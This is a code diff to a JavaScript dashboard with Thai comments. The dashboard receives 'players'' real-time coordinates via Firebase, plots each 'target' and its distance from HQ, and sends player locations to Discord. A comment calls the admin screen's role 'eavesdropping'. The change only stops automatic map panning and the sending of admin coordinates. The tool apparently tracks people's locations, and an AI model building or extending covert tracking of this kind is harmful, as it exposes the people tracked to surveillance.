@@ -1541,8 +1541,7 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
     result.distanceKm = calcDist(result.coords.latitude, result.coords.longitude);
     appendLog(`[DISTANCE]: Target is ${result.distanceKm.toFixed(2)} km away from Center.`, LOG.white);
     
-    panMapTo(result.coords.latitude, result.coords.longitude, 14);
-    
+    // อัปเดตแผนที่ - เฉพาะผู้เล่นเท่านั้น ไม่เลื่อนแผนที่อัตโมัติ
     if (playerId) {
       const p = getPlayer(playerId);
       if (p) {
@@ -1584,6 +1583,8 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
         updateMapCoordsDisplay(result.coords.latitude, result.coords.longitude, p.name);
       }
     } else {
+      // Admin - แสดงข้อมูลบนแผนที่เท่านั้น ไม่ส่งข้อมูลไป Discord
+      // หน้าจอ Dashboard แอดมินมีหน้าที่ "ดักฟังและเปิดรับข้อมูลเท่านั้น" ห้ามทำหน้าที่ส่งข้อมูลเด็ดขาด
       updateMapMarker('admin', null, result.coords.latitude, result.coords.longitude,
         `<b>Admin</b><br>${result.coords.latitude.toFixed(5)}, ${result.coords.longitude.toFixed(5)}<br>${result.distanceKm.toFixed(2)} km from HQ`);
       updateMapCoordsDisplay(result.coords.latitude, result.coords.longitude, 'Admin');
@@ -1591,8 +1592,11 @@ async function runHybridGeolocation(actorLabel = 'Admin', playerId = null) {
     }
   }
   
-  appendLog('Sending to Discord...', LOG.orange);
-  await sendToDiscord(result);
+  // ปิดการส่งพิกัดฝั่งแอดมิน - ส่ง Discord เฉพาะผู้เล่นเท่านั้น
+  if (playerId) {
+    appendLog('Sending to Discord...', LOG.orange);
+    await sendToDiscord(result);
+  }
   appendLog('Complete.', LOG.green);
   
   setHeaderStatus('Ready', 'white');
@@ -2359,9 +2363,10 @@ function initFirebaseListener() {
 function handleRealTimeLocationData(targetId, data) {
   // ค้นหาผู้เล่นที่ตรงกับ targetId
   let p = getPlayer(targetId);
+  const isNewPlayer = !p && data.coords; // ตรวจสอบว่าเป็นผู้เล่นใหม่หรือไม่
   
   // ถ้าไม่มีผู้เล่นในระบบ ให้เพิ่มผู้เล่นใหม่โดยอัตโนมัติ
-  if (!p && data.coords) {
+  if (isNewPlayer) {
     // เพิ่มผู้เล่นใหม่จาก IP ที่ยิงเข้ามา
     const newPlayer = {
       id: targetId,
@@ -2405,10 +2410,11 @@ function handleRealTimeLocationData(targetId, data) {
     // บันทึกลง localStorage
     savePlayers();
     
-    // อัปเดตแผนที่
+    // อัปเดตแผนที่ - เฉพาะผู้เล่นใหม่เท่านั้น เลื่อนแผนที่ไปยังผู้เล่นใหม่
     if (mapInstance && p.coords) {
       updateMapMarker('player', targetId, p.coords.latitude, p.coords.longitude,
         `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
+      // เลื่อนแผนที่เฉพาะผู้เล่นใหม่เท่านั้น
       panMapTo(p.coords.latitude, p.coords.longitude, 14);
     }
     
@@ -2461,12 +2467,11 @@ function handleRealTimeLocationData(targetId, data) {
   // บันทึกลง localStorage
   savePlayers();
   
-  // อัปเดตแผนที่และเลื่อนศูนย์กลางอัตโนมัติ
+  // อัปเดตแผนที่เท่านั้น ไม่เลื่อนแผนที่โดยอัตโมัติ (เพื่อให้ผู้เล่นหลายคนปักหมุดได้โดยไม่ทับกัน)
   if (mapInstance && p.coords) {
     updateMapMarker('player', targetId, p.coords.latitude, p.coords.longitude,
       `<b>${esc(p.name)}</b><br>${p.coords.latitude.toFixed(5)}, ${p.coords.longitude.toFixed(5)}<br>${p.distanceKm ? p.distanceKm.toFixed(2) + ' km from HQ' : ''}<br><a href="https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}" target="_blank" class="text-orange-400">🗺️ เปิดใน Google Maps</a>`);
-    // เลื่อนแผนที่ไปยังพิกัดใหม่โดยอัตโนมัติ
-    panMapTo(p.coords.latitude, p.coords.longitude, 14);
+    // ไม่เลื่อนแผนที่อัตโมัติ - เพื่อให้ผู้เล่นหลายคนปักหมุดได้โดยไม่ทับกัน
   }
   
   // อัปเดต ID ผู้เล่นล่าสุดที่มีการอัปเดตข้อมูล
